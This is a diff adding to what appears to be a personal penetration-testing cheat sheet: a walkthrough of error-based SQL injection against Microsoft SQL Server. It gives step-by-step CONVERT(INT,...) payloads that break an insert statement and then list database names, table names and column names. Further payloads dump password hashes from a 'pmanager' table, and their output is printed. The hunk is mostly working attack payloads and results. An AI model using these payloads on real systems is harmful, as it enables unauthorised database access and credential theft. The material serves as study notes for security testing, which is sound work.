@@ -321,8 +321,92 @@ Blog entry from admind82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537
 ````
 
 #### MSSQL Error DB dumping creds
+##### Reference Sheet
+
 ````
 https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
+````
+
+<img src="https://user-images.githubusercontent.com/127046919/228388326-934cba2a-2a41-42f2-981f-3c68cbaec7da.png" width="400" height="240" />
+
+##### Example Case
+
+````
+' #Entered
+Unclosed quotation mark after the character string '',')'. #response
+````
+###### Visualize the SQL statement being made
+
+````
+insert into dbo.tablename ('',''); 
+#two statements Username and Email. Web Server says User added which indicates an insert statement
+#we want to imagine what the query could potentially look like so we did a mock example above
+insert into dbo.tablename (''',); #this would be created as an example of the error message above
+````
+##### Adjusting our initial Payload
+
+````
+insert into dbo.tablename ('1 AND 1=CONVERT(INT,@@version))--' ,''); #This is what is looks like
+insert into dbo.tablename('',1 AND 1=CONVERT(INT,@@version))-- #Correct payload based on the above
+',1 AND 1=CONVERT(INT,@@version))-- #Enumerate the DB
+Server Error in '/Newsletter' Application.#Response
+Incorrect syntax near the keyword 'AND'. #Response
+',CONVERT(INT,@@version))-- #Corrected Payoad to adjust for the error
+````
+##### Enumerating DB Names
+
+````
+', CONVERT(INT,db_name(1)))--
+master
+', CONVERT(INT,db_name(2)))--
+tempdb
+', CONVERT(INT,db_name(3)))--
+model
+', CONVERT(INT,db_name(4)))--
+msdb
+', CONVERT(INT,db_name(5)))--
+newsletter
+', CONVERT(INT,db_name(6)))--
+archive
+````
+##### Enumerating Table Names
+
+````
+', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM archive.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))))--
+pmanager
+````
+##### Enumerating number of Columns in selected Table
+
+````
+', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager')+CHAR(58)+CHAR(58))))--
+3 entries
+````
+##### Enumerate Column Names
+
+````
+', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 1 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
+alogin
+
+', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 2 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
+id
+
+', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 3 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
+psw
+````
+##### Enumerating Data in Columns
+
+````
+', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 1 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
+3c744b99b8623362b466efb7203fd182
+
+', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 2 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
+5b413fe170836079622f4131fe6efa2d
+
+', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 3 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
+7de6b6f0afadd89c3ed558da43930181
+
+', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 4 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
+cb2d5be3c78be06d47b697468ad3b33b
 ````
 ### SSRF
 SSRF vulnerabilities occur when an attacker has full or partial control of the request sent by the web application. A common example is when an attacker can control the third-party service URL to which the web application makes a request.
